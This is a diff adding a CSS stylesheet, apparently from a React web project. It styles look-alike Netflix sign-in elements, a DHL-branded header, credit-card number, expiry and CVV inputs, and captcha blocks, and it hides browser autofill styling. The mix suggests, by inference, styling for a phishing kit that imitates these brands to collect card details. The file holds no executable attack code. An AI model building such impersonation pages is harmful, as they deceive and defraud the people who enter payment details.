@@ -1,0 +1,331 @@
+.logo {
+  height: 6em;
+  padding: 1.5em;
+  will-change: filter;
+  transition: filter 300ms;
+}
+.logo:hover {
+  filter: drop-shadow(0 0 2em #646cffaa);
+}
+.logo.react:hover {
+  filter: drop-shadow(0 0 2em #61dafbaa);
+}
+
+.card {
+  padding: 2em;
+}
+
+.read-the-docs {
+  color: #888;
+}
+.dropdown {
+  position: relative;
+  display: inline-block;
+  font-family: Arial;
+}
+
+.dropdown-button {
+  background: #000;
+  color: #fff;
+  padding: 8px 12px;
+  border-radius: 4px;
+  border: 1px solid #666;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.dropdown-list {
+  position: absolute;
+  bottom: 100%;
+  left: 2px;
+  background: #fff;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  list-style: none;
+  margin: 0;
+  padding: 0;
+  width: 94%;
+  z-index: 1000;
+}
+
+.dropdown-item {
+  color: #000;
+  padding: 8px 12px;
+  cursor: pointer;
+  transition:
+    background 0.2s,
+    color 0.2s;
+}
+
+.dropdown-item:hover {
+  background-color: #2979ff;
+  color: white;
+}
+
+.dropdown-item.selected {
+  background-color: #2979ff;
+  color: white;
+}
+.link-style {
+  text-decoration: none;
+}
+
+.link-style:hover {
+  text-decoration: underline;
+}
+.cardnumber {
+  width: 406px;
+}
+.date {
+  width: 181px;
+  margin-right: 10px;
+}
+.CVV {
+  width: 181px;
+}
+input:-webkit-autofill {
+  background-color: transparent !important;
+  -webkit-box-shadow: 0 0 0 1000px transparent inset !important;
+  -webkit-text-fill-color: white !important;
+}
+
+input:-webkit-autofill::placeholder {
+  opacity: 0 !important;
+}
+
+.checkbox-wrapper {
+  display: flex;
+  align-items: center;
+  background-color: #fff;
+  padding: 4px;
+  border-radius: 4px;
+}
+
+.custom-checkbox {
+  appearance: none;
+  width: 16px;
+  height: 16px;
+  border: 1px solid #aaa;
+  border-radius: 4px;
+  margin-left: 4px;
+  position: relative;
+  cursor: pointer;
+  background-color: white;
+}
+
+.custom-checkbox:checked {
+  background-color: black;
+  border-color: black;
+}
+
+.checkbox-wrapper label {
+  color: rgba(0, 0, 0, 0.6);
+  font-size: 0.8125rem;
+  font-weight: 400;
+  margin-left: 4px;
+  cursor: pointer;
+}
+.netflix-logo {
+  margin-left: 365px;
+  width: 148px;
+  height: 40px;
+}
+
+@media (max-width: 1280px) {
+  .netflix-logo {
+    margin-left: 32px;
+  }
+}
+@media (max-width: 960px) {
+  .netflix-logo {
+    margin-left: 32px;
+    width: 89px;
+    height: 24px;
+  }
+}
+@media (max-width: 600px) {
+  .netflix-logo {
+    margin-left: 32px;
+    width: 89px;
+    height: 24px;
+  }
+}
+
+.dhl-header {
+  background: #ffcc00;
+  padding: 30px 0;
+  width: 100%;
+}
+
+.dhl-header-content {
+  max-width: 1190px;
+  margin: 0 auto;
+  padding: 0 40px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 16px;
+}
+
+.dhl-logo-area {
+  flex: 1 1 auto;
+}
+
+.dhl-logo {
+  height: auto;
+  width: auto;
+  max-height: 50px;
+  max-width: 100%;
+}
+.dhl-lang-btn {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 6px 12px;
+  background: rgba(255, 255, 255, 0.15);
+  border: 1px solid rgba(255, 255, 255, 0.25);
+  border-radius: 8px;
+  color: #333;
+  font-size: 0.82rem;
+  font-weight: 500;
+  cursor: pointer;
+  font-family: inherit;
+  background-color: rgba(255, 255, 255, 0.5);
+  transition: all 0.15s ease;
+}
+.form-group {
+  margin-bottom: 1rem;
+}
+
+.input-container {
+  position: relative;
+}
+
+.input-container input {
+  width: 100%;
+  padding: 0.5rem 1rem 0.5rem 2.5rem;
+  border: 1px solid #d1d5db;
+  border-radius: 0.375rem;
+  font-size: 1rem;
+  outline: none;
+}
+
+.input-container input:focus {
+  border-color: #3b82f6;
+  box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+}
+
+.input-container input.error {
+  border-color: #ef4444;
+}
+
+.floating-label {
+  position: absolute;
+  left: 2.5rem;
+  top: 0.5rem;
+  color: #6b7280;
+  pointer-events: none;
+  transition: all 0.2s ease;
+}
+
+.input-container input:focus + .floating-label,
+.input-container input:not(:placeholder-shown) + .floating-label {
+  transform: translateY(-1.25rem) scale(0.9);
+  left: 1rem;
+  color: #3b82f6;
+}
+
+.input-icon {
+  position: absolute;
+  left: 0.75rem;
+  top: 0.5rem;
+  height: 1.25rem;
+  width: 1.25rem;
+  color: #9ca3af;
+}
+
+.error-message {
+  display: flex;
+  align-items: center;
+  margin-top: 0.25rem;
+  color: #ef4444;
+  font-size: 0.875rem;
+}
+
+.error-icon {
+  height: 1rem;
+  width: 1rem;
+  margin-right: 0.25rem;
+}
+.navee {
+  margin: 0px 50px;
+}
+.default-ltr-cache {
+  width: 450px;
+  background: rgba(0, 0, 0, 0.7);
+}
+@media (max-width: 600px) {
+  .default-ltr-cache {
+    width: 100%;
+    background: rgba(0, 0, 0);
+    height: 100% !important;
+  }
+}
+@media (max-width: 500px) {
+  .logonet {
+    width: 74px;
+  }
+}
+@media (max-width: 500px) {
+  .navee {
+    height: 46px;
+    margin: 0px 15px;
+  }
+}
+.signout {
+  font-size: 19px;
+}
+@media (max-width: 500px) {
+  .signout {
+    font-size: 14px;
+  }
+}
+
+.inputt {
+  width: 440px;
+}
+@media (max-width: 500px) {
+  .inputt {
+    width: 400px;
+  }
+}
+@media (max-width: 438px) {
+  .inputt {
+    width: 350px;
+  }
+}
+@media (max-width: 380px) {
+  .inputt {
+    width: 300px;
+  }
+}
+
+.captcha-divider {
+  width: 400px;
+}
+.captcha-info {
+  width: 414px;
+}
+@media (max-width: 442px) {
+  .captcha-info {
+    width: calc(100% - 28px);
+  }
+}
+@media (max-width: 442px) {
+  .captcha-divider {
+    width: calc(100% - 28px);
+  }
+}
